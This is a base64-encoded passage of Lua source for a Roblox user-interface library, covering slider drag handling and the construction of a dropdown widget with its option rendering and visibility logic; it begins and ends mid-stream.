Z3NbY2ZnLmZsYWddKQogICAgICAgICAgICBlbmQKCiAgICAgICAgICAgIGl0ZW1zWyAic2xpZGVyIiBdLk1vdXNlQnV0dG9uMURvd246Q29ubmVjdChmdW5jdGlvbigpCiAgICAgICAgICAgICAgICBjZmcuZHJhZ2dpbmcgPSB0cnVlIAogICAgICAgICAgICAgICAgbGlicmFyeTp0d2VlbihpdGVtc1sgInZhbHVlIiBdLCB7VGV4dENvbG9yMyA9IHJnYigyNTUsIDI1NSwgMjU1KX0sIEVudW0uRWFzaW5nU3R5bGUuUXVhZCwgMC4yKQogICAgICAgICAgICBlbmQpCgogICAgICAgICAgICBsaWJyYXJ5OmNvbm5lY3Rpb24odWlzLklucHV0Q2hhbmdlZCwgZnVuY3Rpb24oaW5wdXQpCiAgICAgICAgICAgICAgICBpZiBjZmcuZHJhZ2dpbmcgYW5kIGlucHV0LlVzZXJJbnB1dFR5cGUgPT0gRW51bS5Vc2VySW5wdXRUeXBlLk1vdXNlTW92ZW1lbnQgdGhlbiAKICAgICAgICAgICAgICAgICAgICBsb2NhbCBzaXplX3ggPSAoaW5wdXQuUG9zaXRpb24uWCAtIGl0ZW1zWyAic2xpZGVyIiBdLkFic29sdXRlUG9zaXRpb24uWCkgLyBpdGVtc1sgInNsaWRlciIgXS5BYnNvbHV0ZVNpemUuWAogICAgICAgICAgICAgICAgICAgIGxvY2FsIHZhbHVlID0gKChjZmcubWF4IC0gY2ZnLm1pbikgKiBzaXplX3gpICsgY2ZnLm1pbgogICAgICAgICAgICAgICAgICAgIGNmZy5zZXQodmFsdWUpCiAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgZW5kKQoKICAgICAgICAgICAgbGlicmFyeTpjb25uZWN0aW9uKHVpcy5JbnB1dEVuZGVkLCBmdW5jdGlvbihpbnB1dCkKICAgICAgICAgICAgICAgIGlmIGlucHV0LlVzZXJJbnB1dFR5cGUgPT0gRW51bS5Vc2VySW5wdXRUeXBlLk1vdXNlQnV0dG9uMSB0aGVuCiAgICAgICAgICAgICAgICAgICAgY2ZnLmRyYWdnaW5nID0gZmFsc2UKICAgICAgICAgICAgICAgICAgICBsaWJyYXJ5OnR3ZWVuKGl0ZW1zWyAidmFsdWUiIF0sIHtUZXh0Q29sb3IzID0gcmdiKDcyLCA3MiwgNzMpfSwgRW51bS5FYXNpbmdTdHlsZS5RdWFkLCAwLjIpIAogICAgICAgICAgICAgICAgZW5kIAogICAgICAgICAgICBlbmQpCgogICAgICAgICAgICBpZiBjZmcuc2VwZXJhdG9yIHRoZW4gCiAgICAgICAgICAgICAgICBsaWJyYXJ5OmNyZWF0ZSggIkZyYW1lIiAsIHsKICAgICAgICAgICAgICAgICAgICBBbmNob3JQb2ludCA9IHZlYzIoMCwgMSk7CiAgICAgICAgICAgICAgICAgICAgUGFyZW50ID0gc2VsZi5pdGVtc1sgImVsZW1lbnRzIiBdOwogICAgICAgICAgICAgICAgICAgIFBvc2l0aW9uID0gZGltMigwLCAwLCAxLCAwKTsKICAgICAgICAgICAgICAgICAgICBCb3JkZXJDb2xvcjMgPSByZ2IoMCwgMCwgMCk7CiAgICAgICAgICAgICAgICAgICAgU2l6ZSA9IGRpbTIoMSwgMSwgMCwgMSk7CiAgICAgICAgICAgICAgICAgICAgQm9yZGVyU2l6ZVBpeGVsID0gMDsKICAgICAgICAgICAgICAgICAgICBCYWNrZ3JvdW5kQ29sb3IzID0gcmdiKDM2LCAzNiwgMzcpCiAgICAgICAgICAgICAgICB9KTsKICAgICAgICAgICAgZW5kIAoKICAgICAgICAgICAgY2ZnLnNldChjZmcuZGVmYXVsdCkKICAgICAgICAgICAgY29uZmlnX2ZsYWdzW2NmZy5mbGFnXSA9IGNmZy5zZXQKCiAgICAgICAgICAgIHJldHVybiBzZXRtZXRhdGFibGUoY2ZnLCBsaWJyYXJ5KQogICAgICAgIGVuZCAKCiAgICAgICAgZnVuY3Rpb24gbGlicmFyeTpkcm9wZG93bihvcHRpb25zKSAKICAgICAgICAgICAgbG9jYWwgY2ZnID0gewogICAgICAgICAgICAgICAgbmFtZSA9IG9wdGlvbnMubmFtZSBvciBuaWw7CiAgICAgICAgICAgICAgICBpbmZvID0gb3B0aW9ucy5pbmZvIG9yIG5pbDsKICAgICAgICAgICAgICAgIGZsYWcgPSBvcHRpb25zLmZsYWcgb3IgbGlicmFyeTpuZXh0X2ZsYWcoKTsKICAgICAgICAgICAgICAgIG9wdGlvbnMgPSBvcHRpb25zLml0ZW1zIG9yIHsiIn07CiAgICAgICAgICAgICAgICBjYWxsYmFjayA9IG9wdGlvbnMuY2FsbGJhY2sgb3IgZnVuY3Rpb24oKSBlbmQ7CiAgICAgICAgICAgICAgICBtdWx0aSA9IG9wdGlvbnMubXVsdGkgb3IgZmFsc2U7CiAgICAgICAgICAgICAgICBzY3JvbGxpbmcgPSBvcHRpb25zLnNjcm9sbGluZyBvciBmYWxzZTsKCiAgICAgICAgICAgICAgICB3aWR0aCA9IG9wdGlvbnMud2lkdGggb3IgMTMwOwoKICAgICAgICAgICAgICAgIC0tIElnbm9yZSB0aGVzZSAKICAgICAgICAgICAgICAgIG9wZW4gPSBmYWxzZTsKICAgICAgICAgICAgICAgIG9wdGlvbl9pbnN0YW5jZXMgPSB7fTsKICAgICAgICAgICAgICAgIG11bHRpX2l0ZW1zID0ge307CiAgICAgICAgICAgICAgICBpZ25vcmUgPSBvcHRpb25zLmlnbm9yZSBvciBmYWxzZTsKICAgICAgICAgICAgICAgIGl0ZW1zID0ge307CiAgICAgICAgICAgICAgICB5X3NpemU7CiAgICAgICAgICAgICAgICBzZXBlcmF0b3IgPSBvcHRpb25zLnNlcGVyYXRvciBvciBvcHRpb25zLlNlcGVyYXRvciBvciBmYWxzZTsKICAgICAgICAgICAgfSAgIAoKICAgICAgICAgICAgY2ZnLmRlZmF1bHQgPSBvcHRpb25zLmRlZmF1bHQgb3IgKGNmZy5tdWx0aSBhbmQge2NmZy5pdGVtc1sxXX0pIG9yIGNmZy5pdGVtc1sxXSBvciAiTm9uZSIKICAgICAgICAgICAgZmxhZ3NbY2ZnLmZsYWddID0gY2ZnLmRlZmF1bHQKCiAgICAgICAgICAgIGxvY2FsIGl0ZW1zID0gY2ZnLml0ZW1zOyBkbyAKICAgICAgICAgICAgICAgIC0tIEVsZW1lbnQKICAgICAgICAgICAgICAgICAgICBpdGVtc1sgImRyb3Bkb3duX29iamVjdCIgXSA9IGxpYnJhcnk6Y3JlYXRlKCAiVGV4dEJ1dHRvbiIgLCB7CiAgICAgICAgICAgICAgICAgICAgICAgIEZvbnRGYWNlID0gZm9udHMuc21hbGw7CiAgICAgICAgICAgICAgICAgICAgICAgIFRleHRDb2xvcjMgPSByZ2IoMCwgMCwgMCk7CiAgICAgICAgICAgICAgICAgICAgICAgIEJvcmRlckNvbG9yMyA9IHJnYigwLCAwLCAwKTsKICAgICAgICAgICAgICAgICAgICAgICAgVGV4dCA9ICIiOwogICAgICAgICAgICAgICAgICAgICAgICBQYXJlbnQgPSBzZWxmLml0ZW1zWyAiZWxlbWVudHMiIF07CiAgICAgICAgICAgICAgICAgICAgICAgIE5hbWUgPSAiXDAiOwogICAgICAgICAgICAgICAgICAgICAgICBCYWNrZ3JvdW5kVHJhbnNwYXJlbmN5ID0gMTsKICAgICAgICAgICAgICAgICAgICAgICAgU2l6ZSA9IGRpbTIoMSwgMCwgMCwgMCk7CiAgICAgICAgICAgICAgICAgICAgICAgIEJvcmRlclNpemVQaXhlbCA9IDA7CiAgICAgICAgICAgICAgICAgICAgICAgIEF1dG9tYXRpY1NpemUgPSBFbnVtLkF1dG9tYXRpY1NpemUuWTsKICAgICAgICAgICAgICAgICAgICAgICAgVGV4dFNpemUgPSAxNDsKICAgICAgICAgICAgICAgICAgICAgICAgQmFja2dyb3VuZENvbG9yMyA9IHJnYigyNTUsIDI1NSwgMjU1KQogICAgICAgICAgICAgICAgICAgIH0pOwogICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgIGl0ZW1zWyAibmFtZSIgXSA9IGxpYnJhcnk6Y3JlYXRlKCAiVGV4dExhYmVsIiAsIHsKICAgICAgICAgICAgICAgICAgICAgICAgRm9udEZhY2UgPSBmb250cy5zbWFsbDsKICAgICAgICAgICAgICAgICAgICAgICAgVGV4dENvbG9yMyA9IHJnYigyNDUsIDI0NSwgMjQ1KTsKICAgICAgICAgICAgICAgICAgICAgICAgQm9yZGVyQ29sb3IzID0gcmdiKDAsIDAsIDApOwogICAgICAgICAgICAgICAgICAgICAgICBUZXh0ID0gY2ZnLm5hbWU7CiAgICAgICAgICAgICAgICAgICAgICAgIFBhcmVudCA9IGl0ZW1zWyAiZHJvcGRvd25fb2JqZWN0IiBdOwogICAgICAgICAgICAgICAgICAgICAgICBOYW1lID0gIlwwIjsKICAgICAgICAgICAgICAgICAgICAgICAgU2l6ZSA9IGRpbTIoMSwgMCwgMCwgMCk7CiAgICAgICAgICAgICAgICAgICAgICAgIEJhY2tncm91bmRUcmFuc3BhcmVuY3kgPSAxOwogICAgICAgICAgICAgICAgICAgICAgICBUZXh0WEFsaWdubWVudCA9IEVudW0uVGV4dFhBbGlnbm1lbnQuTGVmdDsKICAgICAgICAgICAgICAgICAgICAgICAgQm9yZGVyU2l6ZVBpeGVsID0gMDsKICAgICAgICAgICAgICAgICAgICAgICAgQXV0b21hdGljU2l6ZSA9IEVudW0uQXV0b21hdGljU2l6ZS5YWTsKICAgICAgICAgICAgICAgICAgICAgICAgVGV4dFNpemUgPSAxNjsKICAgICAgICAgICAgICAgICAgICAgICAgQmFja2dyb3VuZENvbG9yMyA9IHJnYigyNTUsIDI1NSwgMjU1KQogICAgICAgICAgICAgICAgICAgIH0pOwogICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgIGlmIGNmZy5pbmZvIHRoZW4gCiAgICAgICAgICAgICAgICAgICAgICAgIGl0ZW1zWyAiaW5mbyIgXSA9IGxpYnJhcnk6Y3JlYXRlKCAiVGV4dExhYmVsIiAsIHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgIEZvbnRGYWNlID0gZm9udHMuc21hbGw7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICBUZXh0Q29sb3IzID0gcmdiKDEzMCwgMTMwLCAxMzApOwogICAgICAgICAgICAgICAgICAgICAgICAgICAgQm9yZGVyQ29sb3IzID0gcmdiKDAsIDAsIDApOwogICAgICAgICAgICAgICAgICAgICAgICAgICAgVGV4dFdyYXBwZWQgPSB0cnVlOwogICAgICAgICAgICAgICAgICAgICAgICAgICAgVGV4dCA9IGNmZy5pbmZvOwogICAgICAgICAgICAgICAgICAgICAgICAgICAgUGFyZW50ID0gaXRlbXNbICJkcm9wZG93bl9vYmplY3QiIF07CiAgICAgICAgICAgICAgICAgICAgICAgICAgICBOYW1lID0gIlwwIjsKICAgICAgICAgICAgICAgICAgICAgICAgICAgIFBvc2l0aW9uID0gZGltMigwLCA1LCAwLCAxNyk7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICBTaXplID0gZGltMigxLCAtMTAsIDAsIDApOwogICAgICAgICAgICAgICAgICAgICAgICAgICAgQmFja2dyb3VuZFRyYW5zcGFyZW5jeSA9IDE7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICBUZXh0WEFsaWdubWVudCA9IEVudW0uVGV4dFhBbGlnbm1lbnQuTGVmdDsKICAgICAgICAgICAgICAgICAgICAgICAgICAgIEJvcmRlclNpemVQaXhlbCA9IDA7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICBBdXRvbWF0aWNTaXplID0gRW51bS5BdXRvbWF0aWNTaXplLlhZOwogICAgICAgICAgICAgICAgICAgICAgICAgICAgVGV4dFNpemUgPSAxNjsKICAgICAgICAgICAgICAgICAgICAgICAgICAgIEJhY2tncm91bmRDb2xvcjMgPSByZ2IoMjU1LCAyNTUsIDI1NSkKICAgICAgICAgICAgICAgICAgICAgICAgfSk7CiAgICAgICAgICAgICAgICAgICAgZW5kIAoKICAgICAgICAgICAgICAgICAgICBsaWJyYXJ5OmNyZWF0ZSggIlVJUGFkZGluZyIgLCB7CiAgICAgICAgICAgICAgICAgICAgICAgIFBhcmVudCA9IGl0ZW1zWyAibmFtZSIgXTsKICAgICAgICAgICAgICAgICAgICAgICAgUGFkZGluZ1JpZ2h0ID0gZGltKDAsIDUpOwogICAgICAgICAgICAgICAgICAgICAgICBQYWRkaW5nTGVmdCA9IGRpbSgwLCA1KQogICAgICAgICAgICAgICAgICAgIH0pOwogICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgIGl0ZW1zWyAicmlnaHRfY29tcG9uZW50cyIgXSA9IGxpYnJhcnk6Y3JlYXRlKCAiRnJhbWUiICwgewogICAgICAgICAgICAgICAgICAgICAgICBQYXJlbnQgPSBpdGVtc1sgImRyb3Bkb3duX29iamVjdCIgXTsKICAgICAgICAgICAgICAgICAgICAgICAgTmFtZSA9ICJcMCI7CiAgICAgICAgICAgICAgICAgICAgICAgIFBvc2l0aW9uID0gZGltMigxLCAwLCAwLCAwKTsKICAgICAgICAgICAgICAgICAgICAgICAgQm9yZGVyQ29sb3IzID0gcmdiKDAsIDAsIDApOwogICAgICAgICAgICAgICAgICAgICAgICBTaXplID0gZGltMigwLCAwLCAxLCAwKTsKICAgICAgICAgICAgICAgICAgICAgICAgQm9yZGVyU2l6ZVBpeGVsID0gMDsKICAgICAgICAgICAgICAgICAgICAgICAgQmFja2dyb3VuZENvbG9yMyA9IHJnYigyNTUsIDI1NSwgMjU1KQogICAgICAgICAgICAgICAgICAgIH0pOwogICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgIGxpYnJhcnk6Y3JlYXRlKCAiVUlMaXN0TGF5b3V0IiAsIHsKICAgICAgICAgICAgICAgICAgICAgICAgRmlsbERpcmVjdGlvbiA9IEVudW0uRmlsbERpcmVjdGlvbi5Ib3Jpem9udGFsOwogICAgICAgICAgICAgICAgICAgICAgICBIb3Jpem9udGFsQWxpZ25tZW50ID0gRW51bS5Ib3Jpem9udGFsQWxpZ25tZW50LlJpZ2h0OwogICAgICAgICAgICAgICAgICAgICAgICBQYXJlbnQgPSBpdGVtc1sgInJpZ2h0X2NvbXBvbmVudHMiIF07CiAgICAgICAgICAgICAgICAgICAgICAgIFBhZGRpbmcgPSBkaW0oMCwgNyk7CiAgICAgICAgICAgICAgICAgICAgICAgIFNvcnRPcmRlciA9IEVudW0uU29ydE9yZGVyLkxheW91dE9yZGVyCiAgICAgICAgICAgICAgICAgICAgfSk7CiAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgaXRlbXNbICJkcm9wZG93biIgXSA9IGxpYnJhcnk6Y3JlYXRlKCAiVGV4dEJ1dHRvbiIgLCB7CiAgICAgICAgICAgICAgICAgICAgICAgIEZvbnRGYWNlID0gZm9udHMuc21hbGw7CiAgICAgICAgICAgICAgICAgICAgICAgIFRleHRDb2xvcjMgPSByZ2IoMCwgMCwgMCk7CiAgICAgICAgICAgICAgICAgICAgICAgIEJvcmRlckNvbG9yMyA9IHJnYigwLCAwLCAwKTsKICAgICAgICAgICAgICAgICAgICAgICAgVGV4dCA9ICIiOwogICAgICAgICAgICAgICAgICAgICAgICBBdXRvQnV0dG9uQ29sb3IgPSBmYWxzZTsKICAgICAgICAgICAgICAgICAgICAgICAgQW5jaG9yUG9pbnQgPSB2ZWMyKDEsIDApOwogICAgICAgICAgICAgICAgICAgICAgICBQYXJlbnQgPSBpdGVtc1sgInJpZ2h0X2NvbXBvbmVudHMiIF07CiAgICAgICAgICAgICAgICAgICAgICAgIE5hbWUgPSAiXDAiOwogICAgICAgICAgICAgICAgICAgICAgICBQb3NpdGlvbiA9IGRpbTIoMSwgMCwgMCwgMCk7CiAgICAgICAgICAgICAgICAgICAgICAgIFNpemUgPSBkaW0yKDAsIGNmZy53aWR0aCwgMCwgMTYpOwogICAgICAgICAgICAgICAgICAgICAgICBCb3JkZXJTaXplUGl4ZWwgPSAwOwogICAgICAgICAgICAgICAgICAgICAgICBUZXh0U2l6ZSA9IDE0OwogICAgICAgICAgICAgICAgICAgICAgICBCYWNrZ3JvdW5kQ29sb3IzID0gcmdiKDMzLCAzMywgMzUpCiAgICAgICAgICAgICAgICAgICAgfSk7CiAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgbGlicmFyeTpjcmVhdGUoICJVSUNvcm5lciIgLCB7CiAgICAgICAgICAgICAgICAgICAgICAgIFBhcmVudCA9IGl0ZW1zWyAiZHJvcGRvd24iIF07CiAgICAgICAgICAgICAgICAgICAgICAgIENvcm5lclJhZGl1cyA9IGRpbSgwLCA0KQogICAgICAgICAgICAgICAgICAgIH0pOwogICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgIGl0ZW1zWyAic3ViX3RleHQiIF0gPSBsaWJyYXJ5OmNyZWF0ZSggIlRleHRMYWJlbCIgLCB7CiAgICAgICAgICAgICAgICAgICAgICAgIEZvbnRGYWNlID0gZm9udHMuc21hbGw7CiAgICAgICAgICAgICAgICAgICAgICAgIFRleHRDb2xvcjMgPSByZ2IoODYsIDg2LCA4Nyk7CiAgICAgICAgICAgICAgICAgICAgICAgIEJvcmRlckNvbG9yMyA9IHJnYigwLCAwLCAwKTsKICAgICAgICAgICAgICAgICAgICAgICAgVGV4dCA9ICJhd2Rhd2Rhd2Rhd2Rhd2Rhd2Rhd2RhdyI7CiAgICAgICAgICAgICAgICAgICAgICAgIFBhcmVudCA9IGl0ZW1zWyAiZHJvcGRvd24iIF07CiAgICAgICAgICAgICAgICAgICAgICAgIE5hbWUgPSAiXDAiOwogICAgICAgICAgICAgICAgICAgICAgICBTaXplID0gZGltMigxLCAtMTIsIDAsIDApOwogICAgICAgICAgICAgICAgICAgICAgICBCb3JkZXJTaXplUGl4ZWwgPSAwOwogICAgICAgICAgICAgICAgICAgICAgICBCYWNrZ3JvdW5kVHJhbnNwYXJlbmN5ID0gMTsKICAgICAgICAgICAgICAgICAgICAgICAgVGV4dFhBbGlnbm1lbnQgPSBFbnVtLlRleHRYQWxpZ25tZW50LkxlZnQ7CiAgICAgICAgICAgICAgICAgICAgICAgIFRleHRUcnVuY2F0ZSA9IEVudW0uVGV4dFRydW5jYXRlLkF0RW5kOwogICAgICAgICAgICAgICAgICAgICAgICBBdXRvbWF0aWNTaXplID0gRW51bS5BdXRvbWF0aWNTaXplLlk7CiAgICAgICAgICAgICAgICAgICAgICAgIFRleHRTaXplID0gMTQ7CiAgICAgICAgICAgICAgICAgICAgICAgIEJhY2tncm91bmRDb2xvcjMgPSByZ2IoMjU1LCAyNTUsIDI1NSkKICAgICAgICAgICAgICAgICAgICB9KTsKICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICBsaWJyYXJ5OmNyZWF0ZSggIlVJUGFkZGluZyIgLCB7CiAgICAgICAgICAgICAgICAgICAgICAgIFBhcmVudCA9IGl0ZW1zWyAic3ViX3RleHQiIF07CiAgICAgICAgICAgICAgICAgICAgICAgIFBhZGRpbmdUb3AgPSBkaW0oMCwgMSk7CiAgICAgICAgICAgICAgICAgICAgICAgIFBhZGRpbmdSaWdodCA9IGRpbSgwLCA1KTsKICAgICAgICAgICAgICAgICAgICAgICAgUGFkZGluZ0xlZnQgPSBkaW0oMCwgNSkKICAgICAgICAgICAgICAgICAgICB9KTsKICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICBpdGVtc1sgImluZGljYXRvciIgXSA9IGxpYnJhcnk6Y3JlYXRlKCAiSW1hZ2VMYWJlbCIgLCB7CiAgICAgICAgICAgICAgICAgICAgICAgIEltYWdlQ29sb3IzID0gcmdiKDg2LCA4NiwgODcpOwogICAgICAgICAgICAgICAgICAgICAgICBCb3JkZXJDb2xvcjMgPSByZ2IoMCwgMCwgMCk7CiAgICAgICAgICAgICAgICAgICAgICAgIFBhcmVudCA9IGl0ZW1zWyAiZHJvcGRvd24iIF07CiAgICAgICAgICAgICAgICAgICAgICAgIEFuY2hvclBvaW50ID0gdmVjMigxLCAwLjUpOwogICAgICAgICAgICAgICAgICAgICAgICBJbWFnZSA9ICJyYnhhc3NldGlkOi8vMTAxMDI1NTkxNTc1MTg1IjsKICAgICAgICAgICAgICAgICAgICAgICAgQmFja2dyb3VuZFRyYW5zcGFyZW5jeSA9IDE7CiAgICAgICAgICAgICAgICAgICAgICAgIFBvc2l0aW9uID0gZGltMigxLCAtNSwgMC41LCAwKTsKICAgICAgICAgICAgICAgICAgICAgICAgTmFtZSA9ICJcMCI7CiAgICAgICAgICAgICAgICAgICAgICAgIFNpemUgPSBkaW0yKDAsIDEyLCAwLCAxMik7CiAgICAgICAgICAgICAgICAgICAgICAgIEJvcmRlclNpemVQaXhlbCA9IDA7CiAgICAgICAgICAgICAgICAgICAgICAgIEJhY2tncm91bmRDb2xvcjMgPSByZ2IoMjU1LCAyNTUsIDI1NSkKICAgICAgICAgICAgICAgICAgICB9KTsKICAgICAgICAgICAgICAgIC0tIAoKICAgICAgICAgICAgICAgIC0tIEVsZW1lbnQgSG9sZGVyCiAgICAgICAgICAgICAgICAgICAgaXRlbXNbICJkcm9wZG93bl9ob2xkZXIiIF0gPSBsaWJyYXJ5OmNyZWF0ZSggIkZyYW1lIiAsIHsKICAgICAgICAgICAgICAgICAgICAgICAgQm9yZGVyQ29sb3IzID0gcmdiKDAsIDAsIDApOwogICAgICAgICAgICAgICAgICAgICAgICBQYXJlbnQgPSBsaWJyYXJ5WyAiaXRlbXMiIF07CiAgICAgICAgICAgICAgICAgICAgICAgIE5hbWUgPSAiXDAiOwogICAgICAgICAgICAgICAgICAgICAgICBWaXNpYmxlID0gdHJ1ZTsKICAgICAgICAgICAgICAgICAgICAgICAgQmFja2dyb3VuZFRyYW5zcGFyZW5jeSA9IDE7CiAgICAgICAgICAgICAgICAgICAgICAgIFNpemUgPSBkaW0yKDAsIDAsIDAsIDApOwogICAgICAgICAgICAgICAgICAgICAgICBCb3JkZXJTaXplUGl4ZWwgPSAwOwogICAgICAgICAgICAgICAgICAgICAgICBCYWNrZ3JvdW5kQ29sb3IzID0gcmdiKDAsIDAsIDApOwogICAgICAgICAgICAgICAgICAgICAgICBaSW5kZXggPSAxMDsKICAgICAgICAgICAgICAgICAgICB9KTsKICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICBpdGVtc1sgIm91dGxpbmUiIF0gPSBsaWJyYXJ5OmNyZWF0ZSggIkZyYW1lIiAsIHsKICAgICAgICAgICAgICAgICAgICAgICAgUGFyZW50ID0gaXRlbXNbICJkcm9wZG93bl9ob2xkZXIiIF07CiAgICAgICAgICAgICAgICAgICAgICAgIFNpemUgPSBkaW0yKDEsIDAsIDEsIDApOwogICAgICAgICAgICAgICAgICAgICAgICBDbGlwc0Rlc2NlbmRhbnRzID0gdHJ1ZTsKICAgICAgICAgICAgICAgICAgICAgICAgQm9yZGVyQ29sb3IzID0gcmdiKDAsIDAsIDApOwogICAgICAgICAgICAgICAgICAgICAgICBCb3JkZXJTaXplUGl4ZWwgPSAwOwogICAgICAgICAgICAgICAgICAgICAgICBCYWNrZ3JvdW5kQ29sb3IzID0gcmdiKDMzLCAzMywgMzUpOwogICAgICAgICAgICAgICAgICAgICAgICBaSW5kZXggPSAxMDsKICAgICAgICAgICAgICAgICAgICB9KTsKICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICBsaWJyYXJ5OmNyZWF0ZSggIlVJUGFkZGluZyIgLCB7CiAgICAgICAgICAgICAgICAgICAgICAgIFBhZGRpbmdCb3R0b20gPSBkaW0oMCwgNik7CiAgICAgICAgICAgICAgICAgICAgICAgIFBhZGRpbmdUb3AgPSBkaW0oMCwgMyk7CiAgICAgICAgICAgICAgICAgICAgICAgIFBhZGRpbmdMZWZ0ID0gZGltKDAsIDMpOwogICAgICAgICAgICAgICAgICAgICAgICBQYXJlbnQgPSBpdGVtc1sgIm91dGxpbmUiIF0KICAgICAgICAgICAgICAgICAgICB9KTsKICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICBsaWJyYXJ5OmNyZWF0ZSggIlVJTGlzdExheW91dCIgLCB7CiAgICAgICAgICAgICAgICAgICAgICAgIFBhcmVudCA9IGl0ZW1zWyAib3V0bGluZSIgXTsKICAgICAgICAgICAgICAgICAgICAgICAgUGFkZGluZyA9IGRpbSgwLCA1KTsKICAgICAgICAgICAgICAgICAgICAgICAgU29ydE9yZGVyID0gRW51bS5Tb3J0T3JkZXIuTGF5b3V0T3JkZXIKICAgICAgICAgICAgICAgICAgICB9KTsKICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICBsaWJyYXJ5OmNyZWF0ZSggIlVJQ29ybmVyIiAsIHsKICAgICAgICAgICAgICAgICAgICAgICAgUGFyZW50ID0gaXRlbXNbICJvdXRsaW5lIiBdOwogICAgICAgICAgICAgICAgICAgICAgICBDb3JuZXJSYWRpdXMgPSBkaW0oMCwgNCkKICAgICAgICAgICAgICAgICAgICB9KTsKICAgICAgICAgICAgICAgIC0tIAogICAgICAgICAgICBlbmQgCgogICAgICAgICAgICBmdW5jdGlvbiBjZmcucmVuZGVyX29wdGlvbih0ZXh0KQogICAgICAgICAgICAgICAgbG9jYWwgYnV0dG9uID0gbGlicmFyeTpjcmVhdGUoICJUZXh0QnV0dG9uIiAsIHsKICAgICAgICAgICAgICAgICAgICBGb250RmFjZSA9IGZvbnRzLnNtYWxsOwogICAgICAgICAgICAgICAgICAgIFRleHRDb2xvcjMgPSByZ2IoNzIsIDcyLCA3Myk7CiAgICAgICAgICAgICAgICAgICAgQm9yZGVyQ29sb3IzID0gcmdiKDAsIDAsIDApOwogICAgICAgICAgICAgICAgICAgIFRleHQgPSB0ZXh0OwogICAgICAgICAgICAgICAgICAgIFBhcmVudCA9IGl0ZW1zWyAib3V0bGluZSIgXTsKICAgICAgICAgICAgICAgICAgICBOYW1lID0gIlwwIjsKICAgICAgICAgICAgICAgICAgICBTaXplID0gZGltMigxLCAtMTIsIDAsIDApOwogICAgICAgICAgICAgICAgICAgIEJhY2tncm91bmRUcmFuc3BhcmVuY3kgPSAxOwogICAgICAgICAgICAgICAgICAgIFRleHRYQWxpZ25tZW50ID0gRW51bS5UZXh0WEFsaWdubWVudC5MZWZ0OwogICAgICAgICAgICAgICAgICAgIEJvcmRlclNpemVQaXhlbCA9IDA7CiAgICAgICAgICAgICAgICAgICAgQXV0b21hdGljU2l6ZSA9IEVudW0uQXV0b21hdGljU2l6ZS5ZOwogICAgICAgICAgICAgICAgICAgIFRleHRTaXplID0gMTQ7CiAgICAgICAgICAgICAgICAgICAgQmFja2dyb3VuZENvbG9yMyA9IHJnYigyNTUsIDI1NSwgMjU1KTsKICAgICAgICAgICAgICAgICAgICBaSW5kZXggPSAxMDsKICAgICAgICAgICAgICAgIH0pOyBsaWJyYXJ5OmFwcGx5X3RoZW1lKGJ1dHRvbiwgImFjY2VudCIsICJUZXh0Q29sb3IzIik7CiAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgIGxpYnJhcnk6Y3JlYXRlKCAiVUlQYWRkaW5nIiAsIHsKICAgICAgICAgICAgICAgICAgICBQYXJlbnQgPSBidXR0b247CiAgICAgICAgICAgICAgICAgICAgUGFkZGluZ1RvcCA9IGRpbSgwLCAxKTsKICAgICAgICAgICAgICAgICAgICBQYWRkaW5nUmlnaHQgPSBkaW0oMCwgNSk7CiAgICAgICAgICAgICAgICAgICAgUGFkZGluZ0xlZnQgPSBkaW0oMCwgNSkKICAgICAgICAgICAgICAgIH0pOwogICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICByZXR1cm4gYnV0dG9uCiAgICAgICAgICAgIGVuZAogICAgICAgICAgICAKICAgICAgICAgICAgZnVuY3Rpb24gY2ZnLnNldF92aXNpYmxlKGJvb2wpCiAgICAgICAgICAgICAgICBsb2NhbCBhID0gYm9vbCBhbmQgY2ZnLnlfc2l6ZSBvciAwCiAgICAgICAgICAgICAgICBsaWJyYXJ5OnR3ZWVuKGl0ZW1zWyAiZHJvcGRvd25faG9sZGVyIiBdLCB7U2l6ZSA9IGRpbV9vZmZzZXQoaXRlbXNbICJkcm9wZG93biIgXS5BYnNvbHV0ZVNpemUuWCwgYSl9KQoKICAgICAgICAgICAgICAgIGl0ZW1zWyAiZHJvcGRvd25faG9sZGVyIiBdLlBvc2l0aW9uID0gZGltMigwLCBpdGVtc1sgImRyb3Bkb3duIiBdLkFic29sdXRlUG9zaXRpb24uWCwgMCwgaXRlbXNbICJkcm9wZG93biIgXS5BYnNvbHV0ZVBvc2l0aW9uLlkgKyA4MCkKICAgICAgICAgICAgICAgIGlmIG5vdCAoc2VsZi5zYW5pdHkgYW5kIGxpYnJhcnkuY3VycmVudF9vcGVuID09IHNlbGYpIHRoZW4gCiAgICAgICAgICAgICAgICAgICAgbGlicmFyeTpjbG9zZV9lbGVtZW50KGNmZykKICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAgICBlbmQKICAgICAgICAgICAgCiAgICAgICAgICAgIGZ1bmN0aW9uIGNmZy5zZXQodmFsdWUpCiAgICAgICAgICAgICAgICBsb2NhbCBzZWxlY3RlZCA9IHt9CiAgICAgICAgICAgICAgICBsb2NhbCBpc1RhYmxlID0gdHlwZSh2YWx1ZSkgPT0gInRhYmxlIgoKICAgICAgICAgICAgICAgIGZvciBfLCBvcHRpb24gaW4gY2ZnLm9wdGlvbl9pbnN0YW5jZXMgZG8gCiAgICAgICAgICAgICAgICAgICAgaWYgb3B0aW9uLlRleHQgPT0gdmFsdWUgb3IgKGl